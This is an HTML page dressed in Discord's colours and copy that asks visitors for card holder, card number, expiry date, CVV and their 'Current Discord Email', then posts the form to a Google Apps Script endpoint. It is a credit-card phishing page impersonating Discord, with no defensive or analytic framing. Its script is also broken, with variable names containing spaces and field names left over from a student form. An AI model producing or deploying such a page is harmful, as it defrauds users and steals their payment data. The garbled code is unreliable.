<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Database</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#36393f;
    font-family:Arial,sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    color:white;
}

.card{
    width:350px;
    background:#2f3136;
    padding:30px;
    border-radius:15px;
    box-shadow:0 0 25px rgba(0,0,0,0.4);
}

.logo{
    text-align:center;
    margin-bottom:20px;
}

.logo img{
    width:80px;
}

h2{
    text-align:center;
    margin-bottom:25px;
}

label{
    display:block;
    margin-top:15px;
    margin-bottom:6px;
    font-size:14px;
}

input{
    width:100%;
    padding:14px;
    border:none;
    border-radius:6px;
    background:#1e2124;
    color:white;
    font-size:15px;
    outline:none;
}

.row{
    display:flex;
    gap:15px;
}

.row div{
    flex:1;
}

.btn{
    width:100%;
    margin-top:25px;
    padding:14px;
    border:none;
    border-radius:8px;
    background:#5865F2;
    color:white;
    font-size:16px;
    cursor:pointer;
}

.btn:hover{
    background:#4752c4;
}

.popup{
    position:fixed;
    top:20px;
    right:20px;
    background:#57F287;
    color:black;
    padding:15px 20px;
    border-radius:10px;
    font-weight:bold;
    display:none;
}

.note{
    margin-top:15px;
    text-align:center;
    font-size:12px;
    color:#b9bbbe;
}
</style>
</head>

<body>

<div class="popup" id="popup">
    Submitted!
</div>

<div class="card">

    <div class="logo">
        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png">
    </div>

    <h2>Database</h2>

    <label>Card Holder:</label>
    <input type="text" id="name" placeholder="Card Number">

    <div class="row">

        <div>
            <label>Exp Date:</label>
            <input type="text" id="Exp Date:" placeholder="00/00">
        </div>

        <div>
            <label>CVV</label>
            <input type="text" id="CVV" 3 Digits="STEM-A">
        </div>

    </div>

    <label>Email</label>
    <input type="email" id="email" placeholder="Current Discord Email">

    <button class="btn" onclick="submitForm()">
        Submit
    </button>

    <div class="note">
        Explore data, trends, and analysis into the work done to help keep people on Discord safe. Transparency reports cover information about enforcement of our platform policies, as well as our response to user data and intellectual property requests.


    </div>

</div>

<script>

async function submitForm(){

let Card Holder = document.getElementById("Card Holder").value;
let Exp Date = document.getElementById("Exp Date").value;
let CVV = document.getElementById("CVV").value;
let email = document.getElementById("email").value;

if(name === "" || studentid === "" || section === "" || email === ""){
    alert("Please fill in all fields.");
    return;
}

try {

await fetch(
"https://script.google.com/macros/s/AKfycbzrfATwuDwg3HXDNerv5oUkQE_0Yx53g0RLLlAeOJw4QpPPhHreJyPhOqEJ-QEaJ1M5lA/exec",
{
    method: "POST",

    mode: "no-cors",

    headers: {
        "Content-Type": "text/plain"
    },

    body: JSON.stringify({
        name: name,
        studentid: studentid,
        section: section,
        email: email
    })
});

const popup = document.getElementById("popup");

popup.style.display = "block";

setTimeout(function(){
    popup.style.display = "none";
},3000);

document.getElementById("name").value = "";
document.getElementById("studentid").value = "";
document.getElementById("section").value = "";
document.getElementById("email").value = "";

} catch(error){

alert("Error submitting form.");

console.log(error);

}

}

</script>

</body>
</html>
